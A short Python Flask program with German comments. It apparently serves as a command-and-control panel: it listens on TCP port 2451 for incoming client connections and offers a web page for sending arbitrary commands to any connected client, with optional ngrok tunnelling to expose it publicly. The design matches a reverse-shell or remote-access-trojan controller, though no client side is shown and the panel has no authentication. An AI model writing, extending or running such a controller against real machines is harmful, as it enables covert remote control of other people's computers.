import socket
import threading
import time
import subprocess
import requests
from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)
server_socket = None
connections = []


def start_server():
    global server_socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 2451))
    server_socket.listen()
    print("Server gestartet und wartet auf Verbindungen...")
    threading.Thread(target=wait_for_connections, daemon=True).start()


def wait_for_connections():
    global connections
    while True:
        conn, client_address = server_socket.accept()
        print(f"Verbindungsanfrage von {client_address}")
        connections.append((conn, client_address))


def start_ngrok():
    # Starte Ngrok im Hintergrund und leite Port 5000 weiter
    ngrok = subprocess.Popen(['ngrok', 'http', '5000'], stdout=subprocess.PIPE)
    time.sleep(5)  # Warte, bis Ngrok den Tunnel aufgebaut hat

    # Rufe die Ngrok-URL über die Ngrok-API ab
    try:
        response = requests.get("http://127.0.0.1:4040/api/tunnels")
        public_url = response.json()['tunnels'][0]['public_url']
        print("Deine öffentliche Ngrok-URL ist:", public_url)
        return public_url
    except Exception as e:
        print("Fehler beim Abrufen der Ngrok-URL:", e)
        ngrok.terminate()
        return None


@app.route('/')
def index():
    return render_template('index.html', connections=connections)


@app.route('/send_command/<int:index>', methods=['POST'])
def send_command(index):
    conn, client_address = connections[index]
    command = request.form['command']
    conn.sendall(command.encode())
    if command == "bye":
        conn.close()
        connections.pop(index)
        print(f"Verbindung mit {client_address} geschlossen.")
    return redirect(url_for('index'))


if __name__ == "__main__":
    start_server()
    # url = start_ngrok()
    # if url:
    # app.run(host='0.0.0.0', port=5000)
    app.run(host='0.0.0.0', port=5000)
